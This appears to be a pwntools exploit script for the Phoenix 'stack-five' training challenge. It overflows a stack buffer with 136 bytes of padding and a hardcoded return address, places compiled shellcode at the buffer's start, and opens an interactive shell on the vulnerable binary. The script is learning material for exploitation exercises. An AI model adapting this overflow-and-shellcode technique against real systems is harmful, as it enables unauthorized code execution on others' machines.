#!/usr/bin/env python3
#
from pwn import *
import subprocess # library for running Linux system console commands
#
# First need to compile the shellcode into the binary file for import
# We will do this by invoking an external [i.e. non python] system command
subprocess.run("make clean && make", shell=True)
#
file = open("shellcode.bin", "rb")
imported_shellcode = file.read()
file.close()
#
# Need to set the pwntools "context" context for controlling
# many settings in pwntools library's capabilities
# The context is for little-endian AMD64 architecture running on Linux OS
context.update(arch='amd64', os='linux')
#
#################################################################################
#
# Preparing the exploit's payload
#
# The address after the cyclic padding is for overwriting the return address
# and redirecting the flow of code execution into the input-receiving buffer
payload = cyclic(136) + p64(0x7fffffffed40) 
#
# Given that the payload-starting cyclic portion starts at the
# input-receiving buffer's start, we replace the first portions with the shellcode
payload = imported_shellcode + payload[len(imported_shellcode):]
#################################################################################
#
# Launching exploit!
print("Launching The Stack Five Exploit!")
#
# The env={} to ensure the execution environment doesn't have any environmental variables
# This is comprehensively explained in the writeup to the "Stack Two" Phoenix challenge
p = process(["stack-five"], env={}, cwd="/opt/phoenix/amd64")
#
# Sending the command-line inputted payload into the executing stack-three process
p.sendline(payload)
#
# Making the process interactive so users can
# interact with the process via its terminal!
p.interactive() 
